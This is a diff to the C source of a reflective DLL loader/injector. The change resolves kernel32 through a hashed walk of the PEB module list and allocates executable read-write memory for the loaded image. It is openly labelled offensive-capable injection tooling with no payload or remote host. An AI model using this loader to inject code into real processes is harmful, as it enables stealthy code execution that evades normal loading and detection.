@@ -42,13 +42,11 @@ SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 // This is our position independent reflective Dll loader/injector
 DLLEXPORT DWORD WINAPI ReflectiveLoader( VOID )
 {
-	//SOCKET socket;
-
 	// the functions we need
 	LOADLIBRARYA pLoadLibraryA;
 	GETPROCADDRESS pGetProcAddress;
 	VIRTUALALLOC pVirtualAlloc;
-	BYTE bCounter = 3;
+	BYTE bCounter;
 
 	// the initial location of this image in memory
 	DWORD dwLibraryAddress;
@@ -74,8 +72,6 @@ DLLEXPORT DWORD WINAPI ReflectiveLoader( VOID )
 	// we will start searching backwards from our current EIP
 	__asm call getip
 	__asm getip: pop dwLibraryAddress
-	// save our socket for later
-	//__asm mov socket, edi
 
 	// loop through memory backwards searching for our images base address
 	// we dont need SEH style search as we shouldnt generate any access violations with this
@@ -99,10 +95,35 @@ DLLEXPORT DWORD WINAPI ReflectiveLoader( VOID )
 	// get the processes loaded modules. ref: http://msdn.microsoft.com/en-us/library/aa813708(VS.85).aspx
 	dwBaseAddress = (DWORD)((_PPEB)dwBaseAddress)->pLdr;
 
-	dwBaseAddress = DEREF_32( ((PPEB_LDR_DATA)dwBaseAddress)->InInitializationOrderModuleList.Flink );
-
-	// get this kernels base address
-	dwBaseAddress = DEREF_32( dwBaseAddress + 8 );
+	// get the first entry of the InMemoryOrder module list
+	dwValueA = (DWORD)((PPEB_LDR_DATA)dwBaseAddress)->InMemoryOrderModuleList.Flink;
+	while( dwValueA )
+	{
+		// get pointer to current modules name (unicode string)
+		dwValueB = (DWORD)((PLDR_MODULE_MEMORY_ORDER)dwValueA)->BaseDllName.pBuffer;
+		// set bCounter to the length for the loop
+		bCounter = (BYTE)((PLDR_MODULE_MEMORY_ORDER)dwValueA)->BaseDllName.Length;
+		// clear dwValueC which will store the hash of the module name
+		dwValueC = 0;
+		// compute the hash of the module name...
+		do
+		{
+			__asm ror dwValueC, HASH_KEY
+			// normalize to uppercase if the madule name is in lowercase
+			if( *((BYTE *)dwValueB) >= 'a' )
+				dwValueC += *((BYTE *)dwValueB) - 0x20;
+			else
+				dwValueC += *((BYTE *)dwValueB);
+			dwValueB++;
+		} while( --bCounter );
+		// get this modules base address
+		dwBaseAddress = (DWORD)((PLDR_MODULE_MEMORY_ORDER)dwValueA)->BaseAddress;
+		// compare the hash with that of kernel32.dll
+		if( dwValueC == KERNEL32DLL_HASH )
+			break;
+		// get the next entry
+		dwValueA = DEREF_32( dwValueA );
+	}
 
 	// get the VA of the modules NT Header
 	dwExportDir = dwBaseAddress + ((PIMAGE_DOS_HEADER)dwBaseAddress)->e_lfanew;
@@ -119,11 +140,13 @@ DLLEXPORT DWORD WINAPI ReflectiveLoader( VOID )
 	// get the VA for the array of name ordinals
 	dwNameOrdinals = ( dwBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )dwExportDir)->AddressOfNameOrdinals );
 
+	bCounter = 3;
+
 	// loop while we still have imports to find
 	while( bCounter > 0 )
 	{
 		// compute the hash values for this function name
-		dwHashValue = __hash( (LPCSTR)( dwBaseAddress + DEREF_32( dwNameArray ) )  );
+		dwHashValue = __hash( (char *)( dwBaseAddress + DEREF_32( dwNameArray ) )  );
 				
 		// if we have found a function we want we get its virtual address
 		if( dwHashValue == LOADLIBRARYA_HASH || dwHashValue == GETPROCADDRESS_HASH || dwHashValue == VIRTUALALLOC_HASH )
@@ -160,7 +183,7 @@ DLLEXPORT DWORD WINAPI ReflectiveLoader( VOID )
 
 	// allocate all the memory for the DLL to be loaded into. we can load at any address because we will  
 	// relocate the image. Also zeros all memory and marks it as READ, WRITE and EXECUTE to avoid any problems.
-	dwBaseAddress = (DWORD)pVirtualAlloc( NULL, ((PIMAGE_NT_HEADERS32)dwHeaderValue)->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
+	dwBaseAddress = (DWORD)pVirtualAlloc( NULL, ((PIMAGE_NT_HEADERS32)dwHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
 
 	// we must now copy over the headers
 	dwValueA = ((PIMAGE_NT_HEADERS32)dwHeaderValue)->OptionalHeader.SizeOfHeaders;
